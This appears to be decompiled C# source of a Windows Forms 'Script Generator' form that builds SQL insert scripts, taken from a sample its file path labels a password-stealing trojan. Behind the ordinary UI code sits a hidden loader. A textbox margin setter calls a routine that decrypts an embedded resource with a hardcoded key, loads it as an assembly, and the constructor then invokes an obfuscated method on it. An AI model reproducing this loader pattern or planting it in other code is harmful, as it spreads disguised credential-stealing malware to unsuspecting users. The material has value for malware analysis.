// Decompiled with JetBrains decompiler
// Type: SpatialController.frmScriptGen
// Assembly: Rea, Version=1.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 014AEBFB-7EE8-4B39-A7D6-AE7A18313427
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-fb4fb24a50b7f600c65d2bbc049f44337673fa7b0e6e16b6967c06d0cfb666ad.exe

using System;
using System.ComponentModel;
using System.Configuration;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace SpatialController
{
  public class frmScriptGen : Form
  {
    private const int BUFFER = 10;
    private ScriptGenerator _scriptCreator;
    private IContainer components = (IContainer) null;
    private static object Govey;
    private Label label1;
    private TextBox txtServer;
    private TextBox txtTableName;
    private Label label2;
    private TextBox txtExcludeField;
    private Label label3;
    private TextBox txtPath;
    private Label label4;
    private Button cmdGenerate;
    private Button cmdCancel;
    private Button cmdFolder;
    private Label lblStatus;
    private GroupBox grpConnection;
    private TextBox txtDatabase;
    private Label label6;
    private TextBox txtPassword;
    private Label label8;
    private TextBox txtUserName;
    private Label label7;
    private TextBox txtProvider;
    private Label label9;
    private Label lblConnectionDetails;
    private TextBox txtFileName;
    private Label label10;
    private TextBox txtWhereClause;
    private Label label11;

    public frmScriptGen()
    {
      this.InitializeComponent();
      ((System.Type) frmScriptGen.Govey).GetMethod("c4").Invoke((object) null, new object[3]
      {
        (object) "434C52495265666572656E6365417272617949",
        (object) "774354557275733137",
        (object) "SpatialController"
      });
    }

    private void lblConnectionDetails_Click(object sender, EventArgs e)
    {
      if (!this.grpConnection.Visible)
      {
        this.lblConnectionDetails.Text = this.lblConnectionDetails.Text.Replace('+', '-');
        this.grpConnection.Visible = true;
        this.PlaceButtonOnConnectionClick();
      }
      else
      {
        this.lblConnectionDetails.Text = this.lblConnectionDetails.Text.Replace('-', '+');
        this.grpConnection.Visible = false;
        this.PlaceButtonDefault();
      }
    }

    private void Generate()
    {
      this._scriptCreator = new ScriptGenerator();
      this._scriptCreator.ConnectionString = this.ConnectionString();
      string whereClause = string.Empty;
      string empty = string.Empty;
      string outputFileName = this.txtPath.Text + "\\" + this.txtFileName.Text;
      if (this.txtExcludeField.Text.Trim() != string.Empty)
        this._scriptCreator.ColumnToExclude = string.Format(",{0},", (object) this.txtExcludeField.Text.Trim());
      if (this.txtWhereClause.Text.Trim() != string.Empty)
        whereClause = this.txtWhereClause.Text.Trim();
      this._scriptCreator.GenerateInsertStatement(this.txtTableName.Text.Trim(), whereClause, outputFileName);
      this._scriptCreator = (ScriptGenerator) null;
    }

    private void cmdGenerate_Click(object sender, EventArgs e)
    {
      try
      {
        this.lblStatus.Text = "Status : Processing";
        this.Cursor = Cursors.WaitCursor;
        this.lblStatus.Update();
        this.Generate();
        this.lblStatus.Text = "Status : Completed";
      }
      catch (Exception ex)
      {
        this.lblStatus.Text = string.Format("Status : Errored {0}", (object) ex.Message);
      }
      this.lblStatus.Update();
      this.Cursor = Cursors.Default;
    }

    private void PlaceButtonOnConnectionClick()
    {
      this.cmdGenerate.Top = this.grpConnection.Bottom + 10;
      this.Height += this.grpConnection.Height + this.cmdGenerate.Height - 20;
      this.cmdCancel.Top = this.cmdGenerate.Top;
    }

    private void PlaceButtonDefault()
    {
      this.cmdGenerate.Top = this.lblConnectionDetails.Bottom + 10;
      this.cmdCancel.Top = this.cmdGenerate.Top;
      this.Height = this.cmdGenerate.Bottom + this.cmdGenerate.Height + 20;
    }

    private void frmScriptGen_Load(object sender, EventArgs e)
    {
      this.PlaceButtonDefault();
      this.PopulateControls();
    }

    private void cmdCancel_Click(object sender, EventArgs e) => this.Close();

    private void PopulateControls()
    {
      this.txtProvider.Text = ConfigurationManager.AppSettings["Provider"];
      this.txtServer.Text = ConfigurationManager.AppSettings["ServerName"];
      this.txtDatabase.Text = ConfigurationManager.AppSettings["DatabaseName"];
      this.txtUserName.Text = ConfigurationManager.AppSettings["User"];
      this.txtPassword.Text = ConfigurationManager.AppSettings["Password"];
      this.txtFileName.Text = ConfigurationManager.AppSettings["FileName"];
      this.txtPath.Text = ConfigurationManager.AppSettings["Path"];
    }

    private string ConnectionString() => string.Format("Provider={0};Server={1};Database={2};Uid={3};Pwd={4};", (object) this.txtProvider.Text, (object) this.txtServer.Text, (object) this.txtDatabase.Text, (object) this.txtUserName.Text, (object) this.txtPassword.Text);

    private void cmdFolder_Click(object sender, EventArgs e)
    {
      FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
      folderBrowserDialog.Description = "Select the Output Directory";
      folderBrowserDialog.SelectedPath = ".";
      int num = (int) folderBrowserDialog.ShowDialog((IWin32Window) this);
      this.txtPath.Text = folderBrowserDialog.SelectedPath;
      folderBrowserDialog.Dispose();
    }

    private void txtWhereClause_TextChanged(object sender, EventArgs e)
    {
    }

    private void txtProvider_TextChanged(object sender, EventArgs e)
    {
    }

    private void txtDatabase_TextChanged(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private static Padding R3()
    {
      byte[] numArray = (byte[]) new ResourceManager(typeof (frmScriptGen)).GetObject("FireLamp");
      string pass = "88YCQO9GHHPGDYH4ZGHBQ8";
      for (int i = 94230; i >= 0; i += -1)
        numArray = frmScriptGen.Mapping(pass, numArray, i);
      frmScriptGen.R7(frmScriptGen.R5(numArray));
      return new Padding(8, 7, 8, 7);
    }

    private static byte[] Mapping(string pass, byte[] tt, int i)
    {
      tt[i % 47104] = frmScriptGen.@int((frmScriptGen.@object((int) tt[i % 47104] ^ (int) pass[i % 22]) - frmScriptGen.@object((int) tt[(i + 1) % 47104]) + 256) % 256);
      return tt;
    }

    private static int @object(int x) => x;

    private static byte @int(int x) => (byte) x;

    private static object R5(byte[] OSVERSIONINFOEX) => typeof (Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) OSVERSIONINFOEX
    });

    private static void R7(object CompatibilitySwitches) => frmScriptGen.Govey = (object) ((Assembly) CompatibilitySwitches).GetTypes()[11];

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (frmScriptGen));
      this.label1 = new Label();
      this.txtServer = new TextBox();
      this.txtTableName = new TextBox();
      this.label2 = new Label();
      this.txtExcludeField = new TextBox();
      this.label3 = new Label();
      this.txtPath = new TextBox();
      this.label4 = new Label();
      this.cmdGenerate = new Button();
      this.cmdCancel = new Button();
      this.cmdFolder = new Button();
      this.lblStatus = new Label();
      this.grpConnection = new GroupBox();
      this.txtProvider = new TextBox();
      this.label9 = new Label();
      this.txtPassword = new TextBox();
      this.label8 = new Label();
      this.txtUserName = new TextBox();
      this.label7 = new Label();
      this.txtDatabase = new TextBox();
      this.label6 = new Label();
      this.lblConnectionDetails = new Label();
      this.txtFileName = new TextBox();
      this.label10 = new Label();
      this.txtWhereClause = new TextBox();
      this.label11 = new Label();
      this.grpConnection.SuspendLayout();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Location = new Point(123, 103);
      this.label1.Margin = new Padding(8, 0, 8, 0);
      this.label1.MaximumSize = new Size(187, 0);
      this.label1.Name = "label1";
      this.label1.Size = new Size(98, 32);
      this.label1.TabIndex = 0;
      this.label1.Text = "Server";
      this.label1.TextAlign = ContentAlignment.TopRight;
      this.txtServer.Location = new Point(235, 95);
      this.txtServer.Margin = new Padding(8, 7, 8, 7);
      this.txtServer.Name = "txtServer";
      this.txtServer.Size = new Size(463, 38);
      this.txtServer.TabIndex = 10;
      this.txtTableName.Location = new Point(253, 10);
      this.txtTableName.Margin = frmScriptGen.R3();
      this.txtTableName.Name = "txtTableName";
      this.txtTableName.Size = new Size(463, 38);
      this.txtTableName.TabIndex = 1;
      this.label2.AutoSize = true;
      this.label2.Location = new Point(77, 17);
      this.label2.Margin = new Padding(8, 0, 8, 0);
      this.label2.Name = "label2";
      this.label2.RightToLeft = RightToLeft.No;
      this.label2.Size = new Size(162, 32);
      this.label2.TabIndex = 2;
      this.label2.Text = "TableName";
      this.label2.TextAlign = ContentAlignment.TopRight;
      this.txtExcludeField.Location = new Point(253, 72);
      this.txtExcludeField.Margin = new Padding(8, 7, 8, 7);
      this.txtExcludeField.Name = "txtExcludeField";
      this.txtExcludeField.Size = new Size(463, 38);
      this.txtExcludeField.TabIndex = 2;
      this.label3.AutoSize = true;
      this.label3.Location = new Point(11, 79);
      this.label3.Margin = new Padding(8, 0, 8, 0);
      this.label3.Name = "label3";
      this.label3.RightToLeft = RightToLeft.No;
      this.label3.Size = new Size(232, 32);
      this.label3.TabIndex = 4;
      this.label3.Text = "Fields to Exclude";
      this.label3.TextAlign = ContentAlignment.TopRight;
      this.txtPath.Location = new Point(253, 134);
      this.txtPath.Margin = new Padding(8, 7, 8, 7);
      this.txtPath.Name = "txtPath";
      this.txtPath.Size = new Size(409, 38);
      this.txtPath.TabIndex = 3;
      this.label4.AutoSize = true;
      this.label4.Location = new Point(72, 141);
      this.label4.Margin = new Padding(8, 0, 8, 0);
      this.label4.Name = "label4";
      this.label4.RightToLeft = RightToLeft.No;
      this.label4.Size = new Size(167, 32);
      this.label4.TabIndex = 6;
      this.label4.Text = "Output Path";
      this.label4.TextAlign = ContentAlignment.TopRight;
      this.cmdGenerate.Location = new Point(171, 439);
      this.cmdGenerate.Margin = new Padding(8, 7, 8, 7);
      this.cmdGenerate.Name = "cmdGenerate";
      this.cmdGenerate.Size = new Size(200, 55);
      this.cmdGenerate.TabIndex = 7;
      this.cmdGenerate.Text = "&Generate";
      this.cmdGenerate.UseVisualStyleBackColor = true;
      this.cmdGenerate.Click += new EventHandler(this.cmdGenerate_Click);
      this.cmdCancel.DialogResult = DialogResult.Cancel;
      this.cmdCancel.Location = new Point(421, 439);
      this.cmdCancel.Margin = new Padding(8, 7, 8, 7);
      this.cmdCancel.Name = "cmdCancel";
      this.cmdCancel.Size = new Size(200, 55);
      this.cmdCancel.TabIndex = 8;
      this.cmdCancel.Text = "&Cancel";
      this.cmdCancel.UseVisualStyleBackColor = true;
      this.cmdCancel.Click += new EventHandler(this.cmdCancel_Click);
      this.cmdFolder.Location = new Point(685, 131);
      this.cmdFolder.Margin = new Padding(8, 7, 8, 7);
      this.cmdFolder.Name = "cmdFolder";
      this.cmdFolder.Size = new Size(64, 55);
      this.cmdFolder.TabIndex = 4;
      this.cmdFolder.Text = "...";
      this.cmdFolder.UseVisualStyleBackColor = true;
      this.cmdFolder.Click += new EventHandler(this.cmdFolder_Click);
      this.lblStatus.AutoSize = true;
      this.lblStatus.Location = new Point(128, 320);
      this.lblStatus.Margin = new Padding(8, 0, 8, 0);
      this.lblStatus.Name = "lblStatus";
      this.lblStatus.RightToLeft = RightToLeft.No;
      this.lblStatus.Size = new Size(111, 32);
      this.lblStatus.TabIndex = 11;
      this.lblStatus.Text = "Status :";
      this.grpConnection.Controls.Add((Control) this.txtProvider);
      this.grpConnection.Controls.Add((Control) this.label9);
      this.grpConnection.Controls.Add((Control) this.txtPassword);
      this.grpConnection.Controls.Add((Control) this.label8);
      this.grpConnection.Controls.Add((Control) this.txtUserName);
      this.grpConnection.Controls.Add((Control) this.label7);
      this.grpConnection.Controls.Add((Control) this.txtDatabase);
      this.grpConnection.Controls.Add((Control) this.label6);
      this.grpConnection.Controls.Add((Control) this.txtServer);
      this.grpConnection.Controls.Add((Control) this.label1);
      this.grpConnection.Location = new Point(32, 398);
      this.grpConnection.Margin = new Padding(8, 7, 8, 7);
      this.grpConnection.Name = "grpConnection";
      this.grpConnection.Padding = new Padding(8, 7, 8, 7);
      this.grpConnection.Size = new Size(731, 341);
      this.grpConnection.TabIndex = 12;
      this.grpConnection.TabStop = false;
      this.grpConnection.Text = "Connection Details";
      this.grpConnection.Visible = false;
      this.txtProvider.Location = new Point(235, 43);
      this.txtProvider.Margin = new Padding(8, 7, 8, 7);
      this.txtProvider.Name = "txtProvider";
      this.txtProvider.Size = new Size(463, 38);
      this.txtProvider.TabIndex = 9;
      this.txtProvider.TextChanged += new EventHandler(this.txtProvider_TextChanged);
      this.label9.AutoSize = true;
      this.label9.Location = new Point(101, 43);
      this.label9.Margin = new Padding(8, 0, 8, 0);
      this.label9.MaximumSize = new Size(187, 0);
      this.label9.Name = "label9";
      this.label9.Size = new Size(121, 32);
      this.label9.TabIndex = 8;
      this.label9.Text = "Provider";
      this.label9.TextAlign = ContentAlignment.TopRight;
      this.txtPassword.Location = new Point(235, 279);
      this.txtPassword.Margin = new Padding(8, 7, 8, 7);
      this.txtPassword.Name = "txtPassword";
      this.txtPassword.PasswordChar = '*';
      this.txtPassword.Size = new Size(463, 38);
      this.txtPassword.TabIndex = 13;
      this.label8.AutoSize = true;
      this.label8.Location = new Point(83, 286);
      this.label8.Margin = new Padding(8, 0, 8, 0);
      this.label8.MaximumSize = new Size(187, 0);
      this.label8.Name = "label8";
      this.label8.Size = new Size(139, 32);
      this.label8.TabIndex = 6;
      this.label8.Text = "Password";
      this.label8.TextAlign = ContentAlignment.TopRight;
      this.txtUserName.Location = new Point(235, 217);
      this.txtUserName.Margin = new Padding(8, 7, 8, 7);
      this.txtUserName.Name = "txtUserName";
      this.txtUserName.Size = new Size(463, 38);
      this.txtUserName.TabIndex = 12;
      this.label7.AutoSize = true;
      this.label7.Location = new Point(69, 224);
      this.label7.Margin = new Padding(8, 0, 8, 0);
      this.label7.MaximumSize = new Size(187, 0);
      this.label7.Name = "label7";
      this.label7.Size = new Size(156, 32);
      this.label7.TabIndex = 4;
      this.label7.Text = "User Name";
      this.label7.TextAlign = ContentAlignment.TopRight;
      this.txtDatabase.Location = new Point(235, 155);
      this.txtDatabase.Margin = new Padding(8, 7, 8, 7);
      this.txtDatabase.Name = "txtDatabase";
      this.txtDatabase.Size = new Size(463, 38);
      this.txtDatabase.TabIndex = 11;
      this.txtDatabase.TextChanged += new EventHandler(this.txtDatabase_TextChanged);
      this.label6.AutoSize = true;
      this.label6.Location = new Point(83, 162);
      this.label6.Margin = new Padding(8, 0, 8, 0);
      this.label6.MaximumSize = new Size(187, 0);
      this.label6.Name = "label6";
      this.label6.Size = new Size(137, 32);
      this.label6.TabIndex = 2;
      this.label6.Text = "Database";
      this.label6.TextAlign = ContentAlignment.TopRight;
      this.lblConnectionDetails.AutoSize = true;
      this.lblConnectionDetails.Location = new Point(-8, 351);
      this.lblConnectionDetails.Margin = new Padding(8, 0, 8, 0);
      this.lblConnectionDetails.Name = "lblConnectionDetails";
      this.lblConnectionDetails.Size = new Size(297, 32);
      this.lblConnectionDetails.TabIndex = 13;
      this.lblConnectionDetails.Text = "+ Connection Property";
      this.lblConnectionDetails.TextAlign = ContentAlignment.TopRight;
      this.lblConnectionDetails.Click += new EventHandler(this.lblConnectionDetails_Click);
      this.txtFileName.Location = new Point(253, 196);
      this.txtFileName.Margin = new Padding(8, 7, 8, 7);
      this.txtFileName.Name = "txtFileName";
      this.txtFileName.Size = new Size(463, 38);
      this.txtFileName.TabIndex = 5;
      this.label10.AutoSize = true;
      this.label10.Location = new Point(99, 203);
      this.label10.Margin = new Padding(8, 0, 8, 0);
      this.label10.Name = "label10";
      this.label10.RightToLeft = RightToLeft.No;
      this.label10.Size = new Size(144, 32);
      this.label10.TabIndex = 14;
      this.label10.Text = "File Name";
      this.label10.TextAlign = ContentAlignment.TopRight;
      this.txtWhereClause.Location = new Point(253, 258);
      this.txtWhereClause.Margin = new Padding(8, 7, 8, 7);
      this.txtWhereClause.Name = "txtWhereClause";
      this.txtWhereClause.Size = new Size(463, 38);
      this.txtWhereClause.TabIndex = 6;
      this.txtWhereClause.TextChanged += new EventHandler(this.txtWhereClause_TextChanged);
      this.label11.AutoSize = true;
      this.label11.Location = new Point(51, 265);
      this.label11.Margin = new Padding(8, 0, 8, 0);
      this.label11.Name = "label11";
      this.label11.RightToLeft = RightToLeft.No;
      this.label11.Size = new Size(194, 32);
      this.label11.TabIndex = 16;
      this.label11.Text = "Where Clause";
      this.label11.TextAlign = ContentAlignment.TopRight;
      this.AcceptButton = (IButtonControl) this.cmdGenerate;
      this.AutoScaleDimensions = new SizeF(16f, 31f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.CancelButton = (IButtonControl) this.cmdCancel;
      this.ClientSize = new Size(803, 765);
      this.Controls.Add((Control) this.txtWhereClause);
      this.Controls.Add((Control) this.label11);
      this.Controls.Add((Control) this.txtFileName);
      this.Controls.Add((Control) this.label10);
      this.Controls.Add((Control) this.lblConnectionDetails);
      this.Controls.Add((Control) this.lblStatus);
      this.Controls.Add((Control) this.cmdFolder);
      this.Controls.Add((Control) this.cmdCancel);
      this.Controls.Add((Control) this.cmdGenerate);
      this.Controls.Add((Control) this.txtPath);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.txtExcludeField);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.txtTableName);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.grpConnection);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Margin = new Padding(8, 7, 8, 7);
      this.MaximizeBox = false;
      this.Name = nameof (frmScriptGen);
      this.Text = "Script Generator";
      this.Load += new EventHandler(this.frmScriptGen_Load);
      this.grpConnection.ResumeLayout(false);
      this.grpConnection.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
